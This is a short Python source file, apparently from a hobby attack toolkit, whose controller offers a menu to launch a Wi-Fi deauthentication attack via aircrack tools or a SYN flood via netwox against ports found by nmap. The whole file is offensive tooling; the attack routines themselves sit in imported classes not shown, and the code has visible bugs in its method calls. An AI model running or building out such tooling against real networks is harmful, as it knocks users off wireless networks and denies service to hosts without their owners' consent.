import os
from Classes.constants import constants
from Classes.netwox import Netwox
from Classes.nmap import Nmap
from Classes.aircrack import aircrack

class ManualController:

    def switch_user_command(string):
        key = int(string)
        return constants.userCommandDict[key]()

    def run(self):
        switch = input("Enter command\n 1-deauth\n 2-synFlood\n")
        if switch == "1":
            print("1")
            aircrack.monitor_mode()
            aircrack.aireplay_attack()
        elif switch == "2":
            self.syn_flood(self)
        #a = self.switch_user_command(switch)
        #print(a)


    def syn_flood(self):
        nmap_arr = Nmap.define_open_ports()
        netwox = Netwox()
        for nmap_o in nmap_arr:
            netwox.syn_flood_network(nmap_o)
